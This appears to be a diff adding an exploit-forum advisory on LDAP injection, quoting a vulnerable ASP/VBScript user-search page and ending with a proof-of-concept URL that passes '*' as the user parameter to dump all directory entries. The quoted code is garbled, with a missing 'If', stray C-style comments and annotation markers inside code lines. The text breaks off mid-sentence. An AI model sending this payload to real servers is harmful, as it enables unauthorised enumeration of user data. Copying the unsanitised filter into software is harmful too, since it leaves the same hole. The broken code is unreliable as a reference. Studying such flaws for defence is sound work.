@@ -1,0 +1,72 @@
+[+] Vurnerebility:	LDAP Injection 
+[+] Category	 :	Implemented Web exploit	 	
+[+] Category	 :	Attack Technique
+[+] Author 	 :	mc2_s3lector 
+[+] dork   	 :	X/o\"	
+[+] Contact	 : 	www.yogyacarderlink.web.id
+[+] date	 :	4-2-10
+[+] biGthank to	 :	Allah SWT,jasakom,KeDai Computerworks,0n3-d4y n3ro,eplaciano, all*.indonesian like a coding,
+
+---------------------------------------------------------------------------------------------------------------------------------------------------
+Directory acces protokol/directory manipulation,protokol breaker->standar protocol,query
+custom statement,page request,componen execute command,data base server,web apps services
+modify,remove etc.
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+code:
+<html>
+<head>
+<body>
+<%@ Language=VBScript %>
+<%
+Dim userName
+Dim filter
+Dim ldapObj
+Const LDAP_SERVER = "ldap.example"
+userName = Request.QueryString("user")<-----------*1(LOOK THIS BUG LINE PARAMETER USER=EMPTY)
+
+( userName = "" ) then
+Response.Write("<b>Invalid
+request. Please specify a
+valid user name</b><br>")
+Response.End()
+end if
+
+filter= "(uid=" + CStr(userName) + //((*1))
+userName used to initialize filter variable on this line direct query LDAP call to finf filter on ((*.3))
+")" ' searching
+for the user entry
+'Creat LDAP object and setting
+the base dn
+Set ldapObj =
+Server.CreateObject("IPWorksASP.LDAP")
+ldapObj.ServerName = LDAP_SERVER
+ldapObj.DN =
+"ou=people,dc=spilab,dc=com"
+'Setting the search filter
+ldapObj.SearchFilter = ((*.3))filter<---call SearchFilter on this line
+ldapObj.Search
+'Showing the user ennumeratin info
+While ldapObj.result = ((1*.4 to *.5))
+Response.Write("<p>")
+Write("<b><u>User
+information for : " +
+ldapObj.AttrValue(0) + "</u></b><br>")
+For i = 0 To ldapObj.AttrCount -1
+Response.Write("<b>" +
+ldapObj.AttrType(i) +
+"</b> : " + ldapObj.AttrValue(i) + "<br>" )
+Response.Write("</p>")
+Wend ((*.5))
+%>
+</head>
+</body>
+</html>
+---------------------------------------------------------------------------------------------------------------------------------------------------
+control over LDAP to querry =server LDAP & get query result from ((*.4 to *.5))
+
+POC:
+
+http://server/ldapsearch.asp?user=* <----send the * character in the parameter user,result flter variable in code to be initialized with
+(uid=*). The resulting LDAP statement will make the server return
+-------------------------------------------------------------------------------------------------------------------------------------------------
